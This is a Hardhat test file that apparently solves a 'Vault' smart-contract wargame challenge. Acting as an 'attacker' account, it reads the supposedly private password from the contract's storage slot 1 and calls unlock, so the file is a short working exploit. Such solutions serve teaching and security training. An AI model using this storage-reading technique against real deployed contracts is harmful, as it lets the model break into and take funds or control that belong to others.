import { TransactionResponse } from "@ethersproject/providers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract, providers } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "Vault";

describe(CONTRACT_NAME, () => {
  let _owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;
  let tx: TransactionResponse;

  beforeEach(async () => {
    [_owner, attacker] = await ethers.getSigners();

    const secretPassword = "randomPassword";
    const bytesSecretPassword = ethers.utils.formatBytes32String(secretPassword);

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy(bytesSecretPassword);
    await contract.deployed();

    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    const password = await ethers.provider.getStorageAt(contract.address, 1);

    tx = await contract.unlock(password);
    await tx.wait();

    expect(await contract.locked()).to.be.false;
  });
});
